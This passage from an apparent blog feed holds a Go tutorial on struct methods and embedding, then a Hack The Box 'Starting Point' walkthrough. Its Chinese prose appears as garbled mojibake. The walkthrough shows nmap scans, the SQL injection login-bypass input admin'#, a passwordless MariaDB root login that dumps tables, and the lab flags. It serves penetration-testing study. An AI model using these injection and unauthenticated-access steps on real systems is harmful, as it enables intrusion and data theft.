class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span class="hljs-number">18</span>)<br>p1.Dream()<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h3 id="ä»»æ„ç±»å‹æ·»åŠ æ–¹æ³•"><a href="#ä»»æ„ç±»å‹æ·»åŠ æ–¹æ³•" class="headerlink" title="ä»»æ„ç±»å‹æ·»åŠ æ–¹æ³•"></a>ä»»æ„ç±»å‹æ·»åŠ æ–¹æ³•</h3><p>æ¥æ”¶è€…å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼Œä¸ä»…ä»…æ˜¯ç»“æ„ä½“ï¼Œä»»ä½•ç±»å‹éƒ½å¯ä»¥æ‹¥æœ‰æ–¹æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> MyInt <span class="hljs-type">int</span><span class="hljs-comment">//å°† int å®šä¹‰ä¸º MyInt ç±»å‹</span><br><br><span class="hljs-comment">//ä¸º MyInt æ·»åŠ ä¸€ä¸ª SayHello æ–¹æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m MyInt)</span></span> SayHello() &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m1 MyInt<br>m1.SayHello()<br>m1 = <span class="hljs-number">100</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v %T\n&quot;</span>, m1, m1)<br>&#125;<br>&gt;&gt;<br>hello<br><span class="hljs-number">100</span> main.MyInt<br></code></pre></td></tr></table></figure><p><strong>ä¸èƒ½ç»™åˆ«çš„åŒ…çš„ç±»å‹å®šä¹‰æ–¹æ³•</strong></p><h2 id="åµŒå¥—"><a href="#åµŒå¥—" class="headerlink" title="åµŒå¥—"></a>åµŒå¥—</h2><p>ä¸€ä¸ªç»“æ„ä½“å¯ä»¥åµŒå¥—å¦ä¸€ä¸ªç»“æ„ä½“æˆ–ç»“æ„ä½“æŒ‡é’ˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name    <span class="hljs-type">string</span><br>Gender  <span class="hljs-type">string</span><br>Address Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>user1 := User&#123;<br>Name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>Gender: <span class="hljs-string">&quot;w&quot;</span>,<br>Address: Address&#123;<br>Province: <span class="hljs-string">&quot;å››å·&quot;</span>,<br>city:     <span class="hljs-string">&quot;æˆéƒ½&quot;</span>,<br>&#125;,<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;user1=%#v\n&quot;</span>, user1)<br>&#125;<br>&gt;&gt;<br>user1=main.User&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;å››å·&quot;</span>, city:<span class="hljs-string">&quot;æˆéƒ½&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="åµŒå¥—åŒ¿åç»“æ„ä½“"><a href="#åµŒå¥—åŒ¿åç»“æ„ä½“" class="headerlink" title="åµŒå¥—åŒ¿åç»“æ„ä½“"></a>åµŒå¥—åŒ¿åç»“æ„ä½“</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name   <span class="hljs-type">string</span><br>Gender <span class="hljs-type">string</span><br>Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user2 User<br>user2.Name = <span class="hljs-string">&quot;cc&quot;</span><br>user2.Gender = <span class="hljs-string">&quot;w&quot;</span><br>user2.Address.Province = <span class="hljs-string">&quot;å››å·&quot;</span><br>user2.city = <span class="hljs-string">&quot;æˆéƒ½&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;user2=%#v\n&quot;</span>, user2)<br>&#125;<br>&gt;&gt;<br>user2=main.User&#123;Name:<span class="hljs-string">&quot;cc&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;å››å·&quot;</span>, city:<span class="hljs-string">&quot;æˆéƒ½&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜å¯¹é½"><a href="#å†…å­˜å¯¹é½" class="headerlink" title="å†…å­˜å¯¹é½"></a>å†…å­˜å¯¹é½</h2><p>ç»“æ„ä½“å­—æ®µçš„å†…å­˜åˆ†å¸ƒéµå¾ªå†…å­˜å¯¹é½çš„è§„åˆ™</p>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-StartingPoint</title>
    <link href="/2025/03/06/StartingPoint/"/>
    <url>/2025/03/06/StartingPoint/</url>
    
    <content type="html"><![CDATA[<p>ç»ˆäºæŠŠ StartingPoint æ‰“å®Œäº†ï¼ˆç´¯äº†ï¼‰</p><span id="more"></span><h1 id="Tier-0"><a href="#Tier-0" class="headerlink" title="Tier 0"></a>Tier 0</h1><p>æ¯”è¾ƒç®€å•å°±æ²¡å†™</p><h1 id="Tier-1"><a href="#Tier-1" class="headerlink" title="Tier 1"></a>Tier 1</h1><h2 id="Appoinment"><a href="#Appoinment" class="headerlink" title="Appoinment"></a>Appoinment</h2><h3 id="Task-1"><a href="#Task-1" class="headerlink" title="Task  1"></a>Task  1</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">What</span> <span class="hljs-variable">does</span> <span class="hljs-variable">the</span> <span class="hljs-variable">acronym</span> <span class="hljs-variable">SQL</span> <span class="hljs-variable">stand</span> <span class="hljs-variable">for</span><span class="hljs-operator">?</span><br><span class="hljs-operator">:</span><span class="hljs-variable">Structured</span> <span class="hljs-built_in">Query</span> <span class="hljs-built_in">Language</span><br></code></pre></td></tr></table></figure><h3 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> one <span class="hljs-keyword">of</span> the most common <span class="hljs-keyword">type</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">SQL</span> vulnerabilities?<br>:<span class="hljs-keyword">SQL</span> injection<br></code></pre></td></tr></table></figure><h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">What <span class="hljs-keyword">is</span> the <span class="hljs-number">2021</span> OWASP Top <span class="hljs-number">10</span> classification <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> vulnerability?<br>:A03:<span class="hljs-number">2021</span>-Injection<br></code></pre></td></tr></table></figure><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">37</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">60</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">999</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">38</span> ((Debian))<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">15</span>.<span class="hljs-number">07</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">does</span> Nmap report <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> service <span class="hljs-keyword">and</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">that</span> are <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> target?<br>: Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br></code></pre></td></tr></table></figure><h3 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> standard port used <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> HTTPS protocol?<br>:<span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h3 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">a</span> <span class="hljs-built_in">folder</span> called <span class="hljs-keyword">in</span> web-application terminology?<br>:<span class="hljs-built_in">directory</span><br></code></pre></td></tr></table></figure><h3 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">What <span class="hljs-keyword">is</span> the HTTP response code <span class="hljs-keyword">is</span> <span class="hljs-keyword">given</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;Not Found&#x27;</span> errors?<br>:<span class="hljs-number">404</span><br></code></pre></td></tr></table></figure><h3 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Gobuster <span class="hljs-keyword">is</span> one tool used <span class="hljs-keyword">to</span> brute <span class="hljs-keyword">force</span> directories <span class="hljs-keyword">on</span> a webserver. What switch do we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster <span class="hljs-keyword">to</span> specify we<span class="hljs-symbol">&#x27;re</span> looking <span class="hljs-keyword">to</span> discover directories, <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> subdomains?<br>:dir<br></code></pre></td></tr></table></figure><h3 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What single <span class="hljs-keyword">character</span> can be used <span class="hljs-built_in">to</span> comment out <span class="hljs-keyword">the</span> rest <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> MySQL?<br>:<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h3><p>ç›´æ¥è®¿é—® 80 ç«¯å£ï¼Œä¸€ä¸ªç™»å½•æ¡†è¾“å…¥ <code>admin&#39;#</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> handled carefully, it could be interpreted <span class="hljs-keyword">as</span> a <span class="hljs-keyword">comment</span>. Use a <span class="hljs-keyword">comment</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">login</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">without</span> knowing the <span class="hljs-keyword">password</span>. What <span class="hljs-keyword">is</span> the first word <span class="hljs-keyword">on</span> the webpage returned?<br>:Congratulations!<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag"><a href="#Submit-Flag" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:e3d0796d002a446c0e622226f42e9672<br></code></pre></td></tr></table></figure><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Task-1-1"><a href="#Task-1-1" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">During our scan, which<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we <span class="hljs-built_in">find</span> serving MySQL?<br>:3306<br></code></pre></td></tr></table></figure><h3 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2"></a>Task 2</h3><p>æ‰«äº†åŠå¤©æ‰«ä¸å‡ºæ¥ï¼Œå‡†ç¡®æ¥è¯´æ‰«ä¸åŠ¨ï¼Œä¸€æ‰«å°±å¡ï¼Œå¯ä»¥ç›´æ¥è¿æ¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# mysql -h <span class="hljs-number">10.129</span><span class="hljs-number">.141</span><span class="hljs-number">.247</span> -P <span class="hljs-number">3306</span> -uroot<br><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">option</span> <span class="hljs-comment">--ssl-verify-server-cert is disabled, because of an insecure passwordless login.</span><br>Welcome <span class="hljs-keyword">to</span> the MariaDB monitor.  Commands <span class="hljs-keyword">end</span> <span class="hljs-keyword">with</span> ; <span class="hljs-keyword">or</span> \g.<br>Your MariaDB <span class="hljs-keyword">connection</span> id <span class="hljs-keyword">is</span> <span class="hljs-number">63</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">version</span>: <span class="hljs-number">10.3</span><span class="hljs-number">.27</span>-MariaDB<span class="hljs-number">-0</span>+deb10u1 Debian <span class="hljs-number">10</span><br><br>Copyright (c) <span class="hljs-number">2000</span>, <span class="hljs-number">2018</span>, Oracle, MariaDB Corporation Ab <span class="hljs-keyword">and</span> others.<br><br>Support MariaDB developers <span class="hljs-keyword">by</span> giving a star at https://github.com/MariaDB/<span class="hljs-keyword">server</span><br><span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;help;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> help. <span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;\c&#x27;</span> <span class="hljs-keyword">to</span> clear the <span class="hljs-keyword">current</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">statement</span>.<br><br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ <code>MariaDB</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What community-developed MySQL <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> target <span class="hljs-built_in">running</span>?<br>:MariaDB<br></code></pre></td></tr></table></figure><h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">When</span> <span class="hljs-keyword">using</span> the MySQL command <span class="hljs-type">line</span> client, what switch <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> use <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> specify a <span class="hljs-keyword">login</span> username?<br>:-u<br></code></pre></td></tr></table></figure><h3 id="Task-4-1"><a href="#Task-4-1" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which username allows us to log into this MariaDB<span class="hljs-built_in"> instance </span>without providing a password?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:root</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-1"><a href="#Task-5-1" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">In SQL, what <span class="hljs-selector-tag">symbol</span> can we <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">to</span> specify within the query that we want <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">display</span> everything inside <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">table</span>?<br>:*<br></code></pre></td></tr></table></figure><h3 id="Task-6-1"><a href="#Task-6-1" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">In</span> <span class="hljs-keyword">SQL</span>, what symbol <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">each</span> query <span class="hljs-keyword">with</span>?<br>:;<br></code></pre></td></tr></table></figure><h3 id="Task-7-1"><a href="#Task-7-1" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| htb                |<br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_</span>schema |<br><span class="hljs-code">+--------------------+</span><br>4 rows in set (0.353 sec)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>show databases;</code>æŸ¥çœ‹æ•°æ®åº“</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">There are three databases in this MySQL<span class="hljs-built_in"> instance </span>that are common across all MySQL instances. What is the name of the fourth that&#x27;s unique to this host?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:htb</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-1"><a href="#Submit-Flag-1" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>information_schemaï¼Œmysqlï¼Œperformance_schema</code> è¿™å‡ ä¸ªæ•°æ®åº“æ˜¯ MySQL è‡ªå¸¦çš„ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯å››ä¸ªé»˜è®¤åº“ï¼Œè¿˜æœ‰ä¸€ä¸ª <code>sys</code> åº“ã€‚æ‰€ä»¥æˆ‘ä»¬æŸ¥æ‰¾ä¸œè¥¿ä¹Ÿæ˜¯ä» <code>htb</code> &#96; æŸ¥æ‰¾</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">MariaDB [(none)]&gt; use htb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [htb]&gt; show tables;<br>+---------------+<br>|<span class="hljs-string"> Tables_in_htb </span>|<br>+---------------+<br>|<span class="hljs-string"> config        </span>|<br>|<span class="hljs-string"> users         </span>|<br>+---------------+<br>2 rows in set (0.335 sec)<br><br>MariaDB [htb]&gt; select <span class="hljs-symbol">*</span> from config;<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> name                  </span>|<span class="hljs-string"> value                            </span>|<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> timeout               </span>|<span class="hljs-string"> 60s                              </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> security              </span>|<span class="hljs-string"> default                          </span>|<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> auto_logon            </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> max_size              </span>|<span class="hljs-string"> 2M                               </span>|<br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> flag                  </span>|<span class="hljs-string"> 7b4bec00d1a39e3dd4e021ec3d915da8 </span>|<br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> enable_uploads        </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> authentication_method </span>|<span class="hljs-string"> radius                           </span>|<br>+----+-----------------------+----------------------------------+<br>7 rows in set (0.332 sec)<br></code></pre></td></tr></table></figure><p>ç®€å•çš„ sql æŸ¥è¯¢è¯­å¥æŸ¥è¯¢</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:<span class="hljs-number">7</span>b4bec00d1a39e3dd4e021ec3d915da8<br></code></pre></td></tr></table></figure><h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Task-1-2"><a href="#Task-1-2" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">What Nmap <span class="hljs-keyword">scanning </span><span class="hljs-keyword">switch </span>employs the use of default <span class="hljs-keyword">scripts </span>during a <span class="hljs-keyword">scan?</span><br><span class="hljs-keyword"></span>:-<span class="hljs-keyword">sC</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.1.15</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">18</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span><br>Host is up (<span class="hljs-number">0.95</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>     vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>Service Info: OS: Unix<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What service <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> found <span class="hljs-keyword">to</span> be <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">21</span>?<br>:vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What FTP code <span 